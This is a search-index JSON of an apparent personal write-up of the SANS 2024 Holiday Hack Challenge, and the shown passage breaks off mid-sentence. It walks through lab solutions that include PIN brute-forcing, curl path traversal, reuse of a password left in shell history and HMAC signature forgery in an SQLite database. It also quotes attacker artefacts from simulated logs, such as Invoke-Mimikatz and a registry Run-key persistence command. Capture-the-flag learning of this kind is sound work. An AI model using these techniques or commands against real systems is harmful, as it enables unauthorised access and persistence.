{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome","text":""},{"location":"#introduction","title":"Introduction","text":"<p>This year's Holiday Hack was very different:</p> <ul> <li>the event was split into a prologue, Act I, Act II and Act III</li> <li>most challenges had different difficulty levels in case you wanted an easier challenge</li> <li>there was no clear villain*</li> <li>there is a public scoreboard</li> </ul> Navigation tip <p>Even with less than 50 pages, there's still quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S, F, or / to open up the search dialog.</p> <p>TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order! </p> <p>Some of my favourite challenges this year were Santa Vision, Decrypt the Naughty-Nice List and Mobile App Analysis. I also want to call out the Drone Path challenge for being the most impressive challenge, in my opinion, and  Deactivate the Naughty-Nice List for teaching me about yet another technology that I didn't even know existed. </p>"},{"location":"#prologue","title":"Prologue","text":"<p>We start the Holiday Hack back in Geese Islands, where we left off after the 2023 Holiday Hack. The elves are busy packing up, but I guess a couple are slacking off and playing games.</p> <p>1. Elf Connect - </p> <p>Helped Angel Candysalt connect the dots in a game of connections.</p> <p>2. Elf Minder 9000 - </p> <p>Assist Poinsettia McMittens with playing a game of Elf Minder 9000.</p>"},{"location":"#act-i","title":"Act I","text":"<p>For Act I, we've gone back to the North Pole and the elves are busy unpacking and trying to get things sorted for Santa's arrival. Some need our help with unlocking various tasks, while others are slacking off and just want to play games with us. There appear to be a few cracks in the elves' organisational  structure though.</p> <p>3. Frosty Keypad - </p> <p>In a swirl of shredded paper, lies the key. Can you unlock the shredder\u2019s code and uncover Santa's lost secrets?</p> <p>4. cURLing - </p> <p>Team up with Bow Ninecandle to send web requests from the command line using Curl, learning how to interact directly with web servers and retrieve information like a pro!</p> <p>5. Hardware Hacking 101 - </p> <p>Ready your tools and sharpen your wits\u2014only the cleverest can untangle the wires and unlock Santa\u2019s hidden secrets!</p>"},{"location":"#act-ii","title":"Act II","text":"<p>Full-blown war has broken out now, with the elves splitting into two factions behind either Wombley or Alabaster.  Wombley thinks Santa is taking Christmas in the wrong direction and is trying to recover the Naughty- Nice list from Alabaster so that he can ensure Christmas runs properly whereas Alabaster is faithfully following Santa's instructions and trying to keep the Naughty-Nice list safe from Wombley and anyone  else who might try to steal it. Both factions want our help with their mission!</p> <p>6. Mobile Analysis - </p> <p>Help find who has been left out of the naughty AND nice list this Christmas. Please speak with Eve Snowshoes for more information.</p> <p>7. Drone Path - </p> <p>Help the elf defecting from Team Wombley get invaluable, top secret intel to Team Alabaster. Find Chimney Scissorsticks, who is hiding inside the DMZ.</p> <p>8. PowerShell - </p> <p>Team Wombley is developing snow weapons in preparation for conflict, but they've been locked out by their own defenses. Help Piney with regaining access to the weapon operations terminal.</p> <p>9. Snowball Showdown - </p> <p>Wombley has recruited many elves to his side for the great snowball fight we are about to wage. Please help us defeat him by hitting him with more snowballs than he does to us.</p> <p>10. KC7 - </p> <p>Use logs to trace an unknown phishing attack targeting Alabaster\u2019s faction.</p>"},{"location":"#act-iii","title":"Act III","text":"<p>Santa has returned and the war is over. Unfortunately, there's a lot of cleanup to do and the elves need our help - we need to clean up the propaganda streams, determine what has happened in a compromised  network and finally decrypt the Naughty-Nice List and deactivate the malware to prevent it from being  published.</p> <p>11. Santa Vision - </p> <p>Alabaster and Wombley have poisoned the Santa Vision feeds! Knock them out to restore everyone back to their regularly scheduled programming.</p> <p>12. Elf Stack - </p> <p>Help the ElfSOC analysts track down a malicious attack against the North Pole domain.</p> <p>13. Decrypt the Naughty Nice List - </p> <p>Decrypt the Frostbit-encrypted Naughty-Nice list and submit the first and last name of the child at number 440 in the Naughty-Nice list. here.</p> <p>14. Deactivate the Naughty Nice List - </p> <p>Wombley's ransomware server is threatening to publish the Naughty-Nice list. Find a way to deactivate the publication of the Naughty-Nice list by the ransomware server. here.</p>"},{"location":"#conclusion","title":"Conclusion","text":"<p>Another awesome year. Huge thanks to the SANS team for making such wonderful challenges, to  devasti0n, BetaJ, Spiderman011, W3iRdKiD, NigelWittshire and to the rest of the Discord community for their help in getting me unstuck on the more challenging challenges.</p> Santa <p>I thought the holidays were truly lost this year. I am so thankful you were here to right the wrongs of my misguided elves. I will ensure they never jeopardize the holidays again. This is the kind of behavior I expect from Jack Frost and his Trolls, not the elves.</p> <p>But, I suppose I have fault in this as well, since it's the first time I've been away at the start of the season, and after last year's unconventional holidays.</p> <p>Plus, I didn't inform the elves ahead of time. Quite the lesson learned on my part. Even the best of us can always improve.</p> <p>I know each faction had the best interest of the holidays at heart, even if their methods were misguided. It's important to have empathy and forgiveness, especially during the holidays.</p> <p>After all, the greatest gift we give AND receive is time spent with loved ones. Never forget that!</p> <p>Now let's put all this behind us and be merry. Until next year! Happy Holidays!</p> No clear villains <p>Some people would say Wombley is the villain and Alabaster is the protagonist. That's been true in past years, but I don't think we have enough evidence to say that this year.</p> <p></p>"},{"location":"easter_eggs/","title":"Easter Eggs","text":""},{"location":"easter_eggs/#seven-swans-a-swanning","title":"Seven Swans A Swanning","text":"<p>The Holiday Hack Challenges have been based on the 12 Days of Christmas song. This year should be \"Seven Swans A-Swimming\", but doesn't appear to be. I assume it's a joke since Santa is \"swanning about\" while the Elves get ready and then break out into war.</p>"},{"location":"easter_eggs/#jason","title":"Jason","text":"<p>As per usual, Jason is back. He could be found in Frosty Beach and makes a comment about being left behind. When I went back to get a screenshot though, he appears to be gone so perhaps he wasn't left behind after all?</p>"},{"location":"easter_eggs/#elf-minder-9000","title":"Elf Minder 9000","text":"<p>I assume this is a reference to the It's Over 9000 meme</p>"},{"location":"easter_eggs/#drone-path","title":"Drone Path","text":"<p>In Drone Path, Pigeon Lookalike and it's comments are a clear reference to the Bird's Aren't Real conspiracy theory.</p>"},{"location":"easter_eggs/#hardware-hacking","title":"Hardware Hacking","text":"<p>In the code: <pre><code>// console.log(\"PARTY TIME\");\n const tryagainphrases = [\n        \"Level incomplete! Keep playing!\",\n        \"Insert coin to continue your quest!\",\n        \"Continue? Time's running out!\",\n        \"You haven't beaten the high score yet!\",\n        \"Mission not accomplished! Retry?\",\n        \"Game over? Not yet, give it another shot!\",\n        \"The Force is not yet strong with this one.\",\n        \"You haven't completed your Jedi training.\",\n        \"Mission incomplete. The Rebellion still needs you.\",\n        \"The Death Star plans are still out of reach.\",\n        \"Your journey to the Dark Side is not over.\",\n        \"The Force is calling, but you haven't answered.\",\n        \"The Matrix still holds you, Neo.\",\n        \"You haven't broken free of the simulation yet.\",\n        \"Red pill taken, but the truth is not revealed.\",\n        \"The code is still incomplete. Keep hacking.\",\n        \"The Architect awaits your next move.\",\n        \"Reality is still an illusion. Persist.\",\n        \"Objective not complete. The city still needs you.\",\n        \"Neural link still active. Dive deeper.\",\n        \"Hack incomplete. Keep infiltrating.\",\n        \"You're still a ghost in the machine.\",\n        \"Cyber mission not finished. Keep running.\",\n        \"The grid still controls you. Break free.\",\n        \"Mission to Mars not yet completed.\",\n        \"Stardate update: Task unfinished.\",\n        \"You haven't reached the final frontier.\",\n        \"The galaxy awaits your return.\",\n        \"Your voyage is incomplete. Keep exploring.\",\n        \"Space mission still ongoing. Continue the adventure.\",\n        \"Mission not complete, soldier. Keep fighting!\",\n        \"You haven't saved the day yet.\",\n        \"The hero's journey is unfinished.\",\n        \"The battle is still raging. Don't give up.\",\n        \"You haven't defeated the villain yet.\",\n        \"Keep going, the action isn't over.\"\n    ];\n</code></pre> There's also a function called dad?</p>"},{"location":"easter_eggs/#wombley","title":"Wombley?","text":"<p>I still don't know if Wombley's name is Wombly or Wombley? Both are used in the game, so either there's dissent among the SANS team or it's because our previous writeups kept getting it wrong. As someone whose name is frequently misspelt, I feel for Wombl(e)y \ud83d\ude02</p>"},{"location":"easter_eggs/#images","title":"Images","text":"<p>The artwork this year was fantastic. Particularly this propaganda sign: </p> <p>There are 12 gifs on the North Pole monitoring station (another reference to the 12 days of Christmas?) which are all worth looking at. </p>"},{"location":"objectives/act_1/o3_keypad/","title":"Frosty Keypad","text":"<p>Difficulty:  Direct link: Objective 1 terminal</p>"},{"location":"objectives/act_1/o3_keypad/#objective","title":"Objective","text":"<p>Request</p> <p>In a swirl of shredded paper, lies the key. Can you unlock the shredder\u2019s code and uncover Santa's lost secrets?</p> Morcel Nougat <p>Hello again! I'm Morcel Nougat, dashing around like a reindeer on a sugar rush! We've got a bit of a dilemma, and I could really use your expertise.</p> <p>Wombley and Alabaster have taken charge now that Santa\u2019s gone missing, and We're scrambling to get the Wish List secured. But... one of the elves in the Data Management Team got overzealous, and the Shredder McShreddin 9000 gobbled up a crucial document we need to access Santa's chest!</p> <p>It\u2019s our golden ticket to getting Santa\u2019s Little Helper tool working properly. Without it, the hardware hack we're planning is as empty as Santa\u2019s sleigh in January.</p> <p>Think you can help? I can get you into the Shredder McShreddin 9000\u2019s inner workings to retrieve the pieces, but there are two access codes involved. One of the elves left a hint, but it\u2019s all a blur to me!</p> <p>I've noticed that some elves keep referring to a certain book when they walk by. I bet it has the answers we need to crack the code and recover the document!</p> <p>You know, some of the elves always have their noses in the same book when they pass by here. Maybe it\u2019s got the clues we need to crack the code?</p>"},{"location":"objectives/act_1/o3_keypad/#hints","title":"Hints","text":"Who are you calling a dorf? <p>Hmmmm. I know I have seen Santa and the other elves use this keypad. I wonder what it contains. I bet whatever is in there is a National Treasure!</p> Just some light reading <p>See if you can find a copy of that book everyone seems to be reading these days. I thought I saw somebody drop one close by...</p> Shine some light on it <p>Well this is puzzling. I wonder if Santa has a seperate code. Bet that would cast some light on the problem. I know this is a stretch...but...what if you had one of those fancy UV lights to look at the fingerprints on the keypad? That might at least limit the possible digits being used...</p>"},{"location":"objectives/act_1/o3_keypad/#solution","title":"Solution","text":""},{"location":"objectives/act_1/o3_keypad/#silver","title":"Silver","text":"<p>Before solving this challenge, you need to explore the map in order to find the  Frosty Book.</p> <p>Googling \"National Treasure\" leads us to  the film in which an 'Ottendorf cipher' was used. If we assume the sticky tape's number:number:number pairs mean page:word:letter, then we end up with the word 'santa'.  In order to convert this to numbers, we can use the old cellphone buttons:</p> <p></p> <p>to convert it to the code:</p> <p>72682</p>"},{"location":"objectives/act_1/o3_keypad/#gold","title":"Gold","text":"<p>Before solving this challenge, we need to find the UV light in the map. The UV light shows that the only numbers touched were 2, 6, 7 and 8.</p> <p>Since we know the pin is 5-characters long, there are 4^5 possibilities. 1024 is a bit too much to do manually but won't take long with BurpSuite's intruder.</p> <p>22786</p>"},{"location":"objectives/act_1/o3_keypad/#response","title":"Response","text":"<p>Morcel Nougat</p> <p>WOW, you did it! You know, they say Ottendorf ciphers were used back in the Frosty Archives crisis\u2026 or was that during the Jack Frost incident? Either way, you're amazing!</p> <p>But wait\u2014there\u2019s still one more code tucked away! This one might need a bit more elbow grease\u2026 you may need to try a few combinations to crack it!</p> <p>Unbelievable! You found a flaw in the system and completely bypassed the rate limiter. You\u2019re practically an elf legend!</p> <p>Incredible work! You pieced together the code like a true sleuth and retrieved the shreds we need. I\u2019m not quite sure how you\u2019ll put them all together, but if anyone can, it\u2019s you!</p> <p>Your help has been absolutely essential, especially now with Santa missing. Wombley and Alabaster will want to hear all about it\u2014go share the news with Jewel Loggins!</p>"},{"location":"objectives/act_1/o4_cURLing/","title":"cURLing","text":"<p>Difficulty:  Direct link: Objective 1 terminal</p>"},{"location":"objectives/act_1/o4_cURLing/#objective","title":"Objective","text":"<p>Request</p> <p>Team up with Bow Ninecandle to send web requests from the command line using Curl, learning how to interact directly with web servers and retrieve information like a pro!</p> Bow Ninecandle <p>Well hello there! I'm Bow Ninecandle, bright as a twinkling star! Everyone's busy unpacking, but I've grown quite bored of that. Care to join me for a lovely game?</p> <p>Oh Joy! Today, We're diving into something delightful: the curling challenge\u2014without any ice, but plenty of sparkle!</p> <p>No icy brooms here though! We're all about Curl, sending web requests from the command line like magic messages.</p> <p>So, have you ever wielded Curl before? If not, no worries at all, my friend!</p> <p>It's this clever little tool that lets you whisper directly to web servers. Pretty neat, right?</p> <p>Think of it like sending secret scrolls through the interwebs, awaiting a wise reply!</p> <p>To begin, you can type something like curl https://example.com. Voil\u00e0! The HTML of the page appears, like conjuring a spell!</p> <p>Simple enough, huh? But oh, there's a whole world of magic you can cast with Curl!</p> <p>We're just brushing the surface here, but trust me\u2014it\u2019s a hoot and a half!</p> <p>If you get tangled up or need help, just give me a shout! I\u2019m here to help you ace this curling spectacle.</p> <p>So, are you ready to curl those web requests like a pro? Let\u2019s see your magic unfold!</p>"},{"location":"objectives/act_1/o4_cURLing/#hints","title":"Hints","text":"cURL Manual <p>The official cURL man page has tons of useful information on how to use cURL.</p> Don't Squash <p>Take a look at cURL's \"--path-as-is\" option; it controls a default behavior that you may not expect!</p>"},{"location":"objectives/act_1/o4_cURLing/#solution","title":"Solution","text":"<p>Silver can be solved just by using the cURL manual if you're not already familiar with cURL. Gold took me a bit longer; Bow mentions just using three commands which I assumed means we need to send the first answer:</p> <ol> <li><code>curl http://curlingfun:8080</code></li> <li><code>curl https://curlingfun:9090/ -k</code> But now we need to send the final request, and it won't accept that.</li> </ol> <p>So I started to explore the container instead, and quickly found HARDMODE.txt: <pre><code>$ cat HARD-MODE.txt\nPrefer to skip ahead without guidance?  Use curl to craft a request meeting these requirements:\n\n- HTTP POST request to https://curlingfun:9090/\n- Parameter \"skip\" set to \"bow\"\n- Cookie \"end\" set to \"10\"\n- Header \"Hack\" set to \"12ft\"\n</code></pre> That can be done with:  <code>curl https://curlingfun:9090 -k --data \"skip=bow\" -b \"end=10\" -H \"Hack: 12ft\"</code></p> <p>Which garners the response:</p> <p>Excellent!  Now, use curl to access this URL: https://curlingfun:9090/../../etc/button</p> <p>We can do that with <code>curl https://curlingfun:9090/../../etc/button --path-as-is -k</code></p> <p>Great!  Finally, use curl to access the page that this URL redirects to: https://curlingfun:9090/GoodSportsmanship</p> <p>The <code>-L</code> argument tells curl to follow redirections, so: <code>curl -k https://curlingfun:9090/GoodSportsmanship -L</code></p>"},{"location":"objectives/act_1/o4_cURLing/#response","title":"Response","text":"<p>Bow Ninecandle</p> <p>Bravo! Look at you, curling through that like a true web wizard!</p> <p>You zipped through that challenge faster than a curling stone on enchanted ice!</p> <p>You know... rumor has it you can breeze through this with just three commands. Why don\u2019t you give it a whirl?</p> <p>Wait... did you just slice and dice it all into three commands? My stars, you're a Curling conjurer!</p>"},{"location":"objectives/act_1/o5_hardware/","title":"Hardware Hacking","text":"<p>Difficulty: </p>"},{"location":"objectives/act_1/o5_hardware/#objective","title":"Objective","text":"<p>Request</p> <p>Ready your tools and sharpen your wits\u2014only the cleverest can untangle the wires and unlock Santa\u2019s hidden secrets!</p> Jewel Loggins <p>Hello there! I\u2019m Jewel Loggins.</p> <p>I hate to trouble you, but I really need some help. Santa\u2019s Little Helper tool isn\u2019t working, and normally, Santa takes care of this\u2026 but with him missing, it\u2019s all on me.</p> <p>I need to connect to the UART interface to get things running, but it\u2019s like the device just refuses to respond every time I try.</p> <p>I've got all the right tools, but I must be overlooking something important. I've seen a few elves with similar setups, but everyone\u2019s so busy preparing for Santa\u2019s absence.</p> <p>If you could guide me through the connection process, I\u2019d be beyond grateful. It\u2019s critical because this interface controls access to our North Pole access cards!</p> <p>We used to have a note with the serial settings, but apparently, one of Wombley\u2019s elves shredded it! You might want to check with Morcel Nougat\u2014he might have a way to recover it.</p> <p>Search the terminal thoroughly; passwords sometimes get left out in the open.</p> <p>Once you've found it, modify the entry for card number 42 to grant access. Sounds simple, right? Let\u2019s get to it!</p>"},{"location":"objectives/act_1/o5_hardware/#hints","title":"Hints","text":"On the Cutting Edge <p>Hey, I just caught wind of this neat way to piece back shredded paper! It's a fancy heuristic detection technique\u2014sharp as an elf\u2019s wit, I tell ya! Got a sample Python script right here, courtesy of Arnydo. Check it out when you have a sec: heuristic_edge_detection.py.\"</p> Shredded to Pieces <p>Have you ever wondered how elves manage to dispose of their sensitive documents? Turns out, they use this fancy shredder that is quite the marvel of engineering. It slices, it dices, it makes the paper practically disintegrate into a thousand tiny pieces. Perhaps, just perhaps, we could reassemble the pieces?</p> It's in the signature <p>I seem to remember there being a handy HMAC generator included in CyberChef.</p> Hidden in plain sight <p>It is so important to keep sensitive data like passwords secure. Often times, when typing passwords into a CLI (Command Line Interface) they get added to log files and other easy to access locations. It makes it trivial to step back in history and identify the password.</p>"},{"location":"objectives/act_1/o5_hardware/#solution","title":"Solution","text":""},{"location":"objectives/act_1/o5_hardware/#silver","title":"Silver","text":"<p>To begin this challenge, we first need to complete the Frosty Keypad in order to get  the shredded paper. We can then extract that so that we have a <code>slices</code> directory with each paper fragment, and use the  recommended Python script to put it back together.</p> <p></p> <p>While a bit hard to read, it's good enough to show us the settings we need: <pre><code>Baud 115200\nParity even\nData: 7 bits\nStop bits 1 bit\nFlow control rts\n</code></pre></p> <p>so we can connect up the UART, switch down to 3V and connect:</p> <p>The UART all connected up</p> <p>Jewel Loggins</p> <p>Fantastic! You managed to connect to the UART interface\u2014great work with those tricky wires! I couldn't figure it out myself\u2026</p> <p>Next, we need to access the terminal and modify the access database. We're looking to grant access to card number 42.</p> <p>Start by using the slh application\u2014that\u2019s the key to getting into the access database. Problem is, the \u2018slh\u2019 tool is password-protected, so we need to find it first.</p> <p>After switching over to the \"Hardware Hacking 102\" terminal, we can look in the history to see the slh tool has previously been run. Since the password is passed in through a CLI argument, we simply need to update the card number.</p> <p><code>slh --passcode CandyCaneCrunch77 --set-access 1 --id 42</code></p> <p>... Card 42 granted access level 1.</p>"},{"location":"objectives/act_1/o5_hardware/#gold","title":"Gold","text":"<p>Jewel Loggins</p> <p>Rumor has it you might be able to bypass the hardware altogether for the gold medal. Why not see if you can find that shortcut?</p> <p>In main.js, we can see the following comment: <pre><code>// Build the URL with the request ID as a query parameter\n// Word on the wire is that some resourceful elves managed to brute-force their way in through the v1 API.\n// We have since updated the API to v2 and v1 \"should\" be removed by now.\n// const url = new URL(`${window.location.protocol}//${window.location.hostname}:${window.location.port}/api/v1/complete`);\n</code></pre></p> <p>To complete gold, we simply have to send the same request to /api/v1 instead of /api/v2</p> <p>Jewel Loggins</p> <p>Wow! You're amazing at this! Clever move finding the password in the command history. It\u2019s a good reminder about keeping sensitive information secure\u2026</p> <p>There\u2019s a tougher route if you're up for the challenge to earn the Gold medal. It involves directly modifying the database and generating your own HMAC signature.</p> <p>I know you can do it\u2014come back once you've cracked it!</p> <p>For gold, we can see that <code>slh</code> is using a SQLite database. We can use the following to view the tables and their contents:</p> <pre><code>slh@slhconsole\\&gt; sqlite3\nSQLite version 3.40.1 2022-12-28 14:03:47\nEnter \".help\" for usage hints.\nConnected to a transient in-memory database.\nUse \".open FILENAME\" to reopen on a persistent database.\nsqlite&gt; .tables\nsqlite&gt; .open access_cards\nsqlite&gt; .schema config\nCREATE TABLE config (\n            id INTEGER PRIMARY KEY,\n            config_key TEXT UNIQUE,\n            config_value TEXT\n        );\nsqlite&gt; .schema access_cards\nCREATE TABLE access_cards (\n            id INTEGER PRIMARY KEY,\n            uuid TEXT,\n            access INTEGER,\n            sig TEXT\n        );\n\n&gt; SELECT * FROM config;\n1|hmac_secret|9ed1515819dec61fd361d5fdabb57f41ecce1a5fe1fe263b98c0d6943b9b232e\n2|hmac_message_format|{access}{uuid}\n3|admin_password|3a40ae3f3fd57b2a4513cca783609589dbe51ce5e69739a33141c5717c20c9c1\n4|app_version|1.0\n\n&gt; SELECT * FROM access_cards WHERE id == 42;\n42|c06018b6-5e80-4395-ab71-ae5124560189|0|ecb9de15a057305e5887502d46d434c9394f5ed7ef1a51d2930ad786b02f6ffd\n</code></pre> <p>So presumably we need to use 42's uuid and 1 (to set the access to admin) to create a new sig with the configured hmac_secret.</p> <p>Testing the signatures</p> <p>Initially, this confused me because using the admin password with known values to try to recreate the sig didn't work. So I tried solving it the silver way and then using the values dumped from the database.</p> <p>Naturally, that didn't work; the existing signatures won't recreate because the key we're provided is different from the key <code>slh</code> is using.</p> <p>We can use [Cyberchef](https://gchq.github.io/CyberChef/#recipe=HMAC(%7B'option':'Latin1','string':'9ed1515819dec61fd361d5fdabb57f41ecce1a5fe1fe263b98c0d6943b9b232e'%7D,'SHA256')&amp;input=MWMwNjAxOGI2LTVlODAtNDM5NS1hYjcxLWFlNTEyNDU2MDE4OQ) to create our new signature, and then run the following SQL command to update the database:</p> <pre><code>UPDATE access_cards SET access=1, sig='135a32d5026c5628b1753e6c67015c0f04e26051ef7391c2552de2816b1b7096' WHERE id=42;\n</code></pre>"},{"location":"objectives/act_1/o5_hardware/#response","title":"Response","text":"<p>Jewel Loggins</p> <p>Brilliant work! We now have access to\u2026 the Wish List! I couldn't have done it without you\u2014thank you so much!</p>"},{"location":"objectives/act_2/o10_kc7/","title":"KC7","text":"<p>Difficulty: </p>"},{"location":"objectives/act_2/o10_kc7/#objective","title":"Objective","text":"<p>Request</p> <p>Investigate a phishing attack targeting Wombley's team, uncovering espionage activities. Track and analyze the impacts of a ransomware attack initiated by Wombley's faction. Use logs to trace an unknown phishing attack targeting Alabaster's faction.</p> Pepper Minstix <p>This is weird, I got some intel about an imminent attack.</p> <p>Pepper Minstix here! I've got urgent news from neutral ground.</p> <p>The North Pole is facing a serious cyber threat, and it's putting all the factions on edge. The culprits? Some troublemakers from Team Wombley.</p> <p>They've launched a barrage of phishing attacks, ransomware, and even some sneaky espionage, causing quite the stir.</p> <p>It's time to jump into action and get cracking on this investigation\u2014there's plenty of cyber-sleuthing to do.</p> <p>You'll be digging into KQL logs, tracking down phishing schemes, and tracing compromised accounts like a seasoned pro.</p> <p>Malware infections have already breached Alabaster Snowball's systems, so we need swift action.</p> <p>Your top mission: neutralize these threats, with a focus on the ransomware wreaking havoc from Team Wombley.</p> <p>It's a hefty challenge, but I know you're up to it. We need your expertise to restore order and keep the peace.</p> <p>You've got the tools, the skills, and the know-how\u2014let's show Team Wombley we mean business.</p> <p>Ready to dive in? Let's defend the North Pole and bring back the holiday harmony!</p>"},{"location":"objectives/act_2/o10_kc7/#solution","title":"Solution","text":""},{"location":"objectives/act_2/o10_kc7/#kql-101","title":"KQL 101","text":"<ol> <li>Type let's do this into the answer (not the run table)</li> <li>Run      <code>Employees     | take 10</code> to see that we have hire_date, name, user_agent, ip_addr, email_addr, username, role, hostname, mfa_enabled and company_domain.     Then type <code>when in doubt take 10</code> into the answer box</li> <li>Run the provided command to see there are 90 employees. (Preview may get an answer quicker)</li> <li>We can find the toy maker's name by running:     <pre><code>Employees\n| where role == 'Chief Toy Maker'\n</code></pre> Shinny Upatree</li> <li>Just type <code>operator</code></li> <li>Run     <pre><code>Employees\n| where name contains \u201cAngel Candysalt\u201d\n</code></pre>     to find out her email is angel_candysalt@santaworkshopgeeseislands.org.      We can then use this to get the count:     <code>Email     | where recipient == \"angel_candysalt@santaworkshopgeeseislands.org\"     | count</code> = 31</li> <li> <p>Run     <code>Email     | where sender has \"twinkle_frostington@santaworkshopgeeseislands.org\"     | distinct recipient     | count</code> = 32      I'm not sure why it says . We don't want all distinct      recipients of santaworkshopgeeseislands.org so it should be recipient. <li> <p>First, get IP address using: <code>Employees | where name == \u201cTwinkle Frostington\u201d</code> (with the answer 10.10.0.36) Next, use this to get the distinct count with: <code>OutboundNetworkEvents | where src_ip == \"10.10.0.36\" | distinct  url | count</code> Fortunately he didn't visit multiple different paths (or they aren't all tracked) = 4</p> </li> <li> <p>For this, we can run: <code>PassiveDns | where domain contains \"green\" | distinct  domain | count</code> = 10</p> </li> <li> <p>For this one, note that new lines between queries will cause errors: <pre><code>let twinkle_ips = Employees\n| where name has \"Twinkle\"\n| distinct ip_addr;\nOutboundNetworkEvents \n| where src_ip in (twinkle_ips) \n| distinct url\n| count\n</code></pre> = 8</p> </li> <p>8</p> <p>Submit this to your badge for the achievement.</p>"},{"location":"objectives/act_2/o10_kc7/#operation-surrender-alabasters-espionage","title":"Operation Surrender: Alabaster's Espionage","text":"<ol> <li>Type surrender</li> <li><code>Email | where subject contains \"surrender\"</code> shows surrender@northpolemail.com</li> <li>Add to the last query: <pre><code>Email | where subject contains \"surrender\"\n| distinct recipient | count\n</code></pre> shows 22.  Bonus: A total of 27 were sent; who got multiples? Using | summarize Count=count() by recipient` shows starla_peppermintz got 3 (due to FW / RE)</li> <li><code>SecurityAlerts | where description contains \"surrender\"</code> = Team_Wombley_Surrender.doc</li> <li>Simply fill in the template: <pre><code>Employees\n| join kind=inner (\n   OutboundNetworkEvents\n) on $left.ip_addr == $right.src_ip // condition to match rows\n| where url contains \"Team_Wombley_Surrender.doc\"\n| project name, ip_addr, url, timestamp // project returns only the information you select\n| sort by timestamp asc //sorts time ascending\n</code></pre> = Joyelle Tinseltoe</li> <li>The timestamp was 2024-11-27T14:11:45Z, so: <pre><code>let hname = Employees | where name == \"Joyelle Tinseltoe\" | distinct hostname;\nProcessEvents | where timestamp between(datetime(\"2024-11-27T14:11:45Z\") .. datetime(\"2024-11-27T14:12:45Z\")) | where hostname in (hname)\n</code></pre> = keylogger.exe</li> <li>Set flag to <code>keylogger.exe</code> and run the code to get <code>a2V5bG9nZ2VyLmV4ZQ==</code></li> </ol> <p>a2V5bG9nZ2VyLmV4ZQ==</p> <p>Submit this to your badge for the achievement</p>"},{"location":"objectives/act_2/o10_kc7/#operation-snowfall-team-wombleys-ransomware-raid","title":"Operation Snowfall: Team Wombley's Ransomware Raid","text":"<ol> <li>Snowfall</li> <li>Just run the provided command to get 59.171.58.12</li> <li><code>AuthenticationEvents | where src_ip == '59.171.58.12' and result == \"Successful Login\" | distinct username | count</code> = 23</li> <li><code>AuthenticationEvents | where src_ip == '59.171.58.12' and result == \"Successful Login\" | distinct description</code> shows it's using RDP</li> <li>We should start this by getting the timestamp with: <pre><code>let hname= Employees | where name contains \"Alabaster\" | distinct hostname;\nAuthenticationEvents | where hostname in (hname) and src_ip == '59.171.58.12' and result  == \"Successful Login\"\n</code></pre> This gives us a time of 2024-12-11T01:39:50Z We can then use it to filter the process events: <code>ProcessEvents | where hostname in (hname) and timestamp between (datetime('2024-12-11T01:39:50Z') .. datetime('2025-12-12T01:39:50Z')) | sort by timestamp asc</code> Looking through the events, we can see lots of moving files around and then an event that copies to wocube: <code>copy C:\\Users\\alsnowball\\AppData\\Local\\Temp\\Secret_Files.zip \\\\wocube\\share\\alsnowball\\Secret_Files.zip</code> Secret_Files.zip</li> <li>Looking at the same results we found earlier, we can see the answer is EncryptEverything.exe</li> <li><code>RW5jcnlwdEV2ZXJ5dGhpbmcuZXhl</code></li> </ol> <p>RW5jcnlwdEV2ZXJ5dGhpbmcuZXhl</p> <p>Submit this to your badge for the achievement.</p>"},{"location":"objectives/act_2/o10_kc7/#echoes-in-the-frost-tracking-the-unknown-threat","title":"Echoes in the Frost: Tracking the Unknown Threat","text":"<ol> <li>Stay Frosty</li> <li><code>Email | where recipient contains \"noel\" and subject contains \"breach\"| sort by timestamp asc</code> 2024-12-12T14:48:55Z</li> <li>Using the URL found in previous result <code>OutboundNetworkEvents | where url == \"https://holidaybargainhunt.io/published/files/files/echo.exe\"</code> 2024-12-12T15:13:55Z</li> <li><code>PassiveDns | where domain contains \"holidaybargainhunt\"</code> 182.56.23.122</li> <li><code>AuthenticationEvents | where src_ip == \"182.56.23.122\" | distinct hostname</code> WebApp-ElvesWorkshop</li> <li><code>ProcessEvents | where hostname == \"WebApp-ElvesWorkshop\" | distinct process_commandline</code> I found this a little unclear which part of the command to specify, but apparently it should just be the powershell name: Invoke-Mimikatz.ps1</li> <li>We need the hostname first: <pre><code>let hname = Employees | where name == \"Noel Boetie\" | distinct hostname;\nProcessEvents | where  hostname in (hname) and timestamp between (datetime(\"2024-12-12T15:13:55Z\") .. datetime(\"2025-12-12T15:13:55Z\"))\n</code></pre> 2024-12-12T15:14:38Z</li> <li><code>OutboundNetworkEvents | where url contains \"holidaycandy.hta\"</code> compromisedchristmastoys.com</li> <li>In the results from question 7, we can see the directory was zipped up and then the following command was run: <code>New-Item -Path \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"MS SQL Writer\" -Force | New-ItemProperty -Name \"frosty\" -Value \"C:\\Windows\\Tasks\\sqlwriter.exe\" -PropertyType String -Force</code> sqlwriter.exe</li> <li>This question is just asking about the <code>-Name</code> parameter, so frosty</li> <li>ZnJvc3R5</li> </ol> <p>ZnJvc3R5</p> <p>Submit this to your badge for the achievement</p>"},{"location":"objectives/act_2/o10_kc7/#response","title":"Response","text":"<p>Pepper Minstix</p> <p>Outstanding work! You've expertly sifted through the chaos of the KQL logs and uncovered crucial evidence. We're one step closer to saving the North Pole!</p> <p>Bravo! You've traced those phishing emails back to their devious source. Your sharp detective skills are keeping our elves safe from harm!</p> <p>Fantastic! You've tracked down the compromised accounts and put a stop to the malicious activity. Our systems are stronger thanks to you!</p> <p>Incredible! You've neutralized the ransomware and restored order across the North Pole. Peace has returned, and it's all thanks to your relentless determination!</p> <p>Ho-ho-holy snowflakes! You've done it! With the precision of a candy cane craftsman and the bravery of a reindeer on a foggy night, you've conquered all four tasks! You're a true holiday hero!</p>"},{"location":"objectives/act_2/o6_mobile/","title":"Mobile Analysis","text":"<p>Difficulty: </p>"},{"location":"objectives/act_2/o6_mobile/#objective","title":"Objective","text":"<p>Request</p> <p>Help find who has been left out of the naughty AND nice list this Christmas. Please speak with Eve Snowshoes for more information.</p> Eve Snowshoes <p>Hi there, tech saviour! Eve Snowshoes and Team Alabaster in need of assistance.</p> <p>I've been busy creating and testing a modern solution to Santa\u2019s Naughty-Nice List, and I even built an Android app to streamline things for Alabaster\u2019s team.</p> <p>But here\u2019s my tiny reindeer-sized problem: I made a debug version and a release version of the app.</p> <p>I accidentally left out a child's name on each version, but for the life of me, I can't remember 